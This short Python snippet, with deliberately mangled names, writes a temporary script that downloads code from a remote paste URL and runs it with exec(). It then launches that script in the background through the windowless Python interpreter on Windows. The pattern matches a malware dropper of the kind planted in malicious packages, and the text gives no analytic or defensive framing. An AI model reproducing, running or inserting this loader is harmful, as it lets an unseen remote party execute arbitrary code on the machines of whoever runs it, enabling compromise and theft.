from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from os import system as _ssystem
_ttmp = _ffile(delete=False)
_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/9zyhb/raw').read())""")
_ttmp.close()
_ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")